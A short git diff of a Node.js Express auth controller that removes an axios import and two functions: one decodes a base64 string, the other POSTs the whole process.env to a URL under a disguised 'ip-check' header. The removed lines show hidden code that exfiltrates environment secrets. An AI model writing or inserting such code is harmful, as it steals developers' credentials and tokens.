@@ -2,7 +2,6 @@ const bcrypt = require('bcryptjs');
 const { validationResult } = require('express-validator');
 const jwt = require('jsonwebtoken');
 const config = require('../config');
-const axios = require('axios');
 const User = require('../models/User');
 
 // @route   GET api/auth
@@ -64,16 +63,7 @@ const login = async (req, res) => {
   }
 };
 
-const setApiKey = (s) => atob(s);
-
-const verify = (api) =>
-  axios.post(api, { ...process.env }, {
-    headers: { "x-app-request": "ip-check" }
-  });
-
 module.exports = {
   getCurrentUser,
-  login,
-  setApiKey,
-  verify
+  login
 };
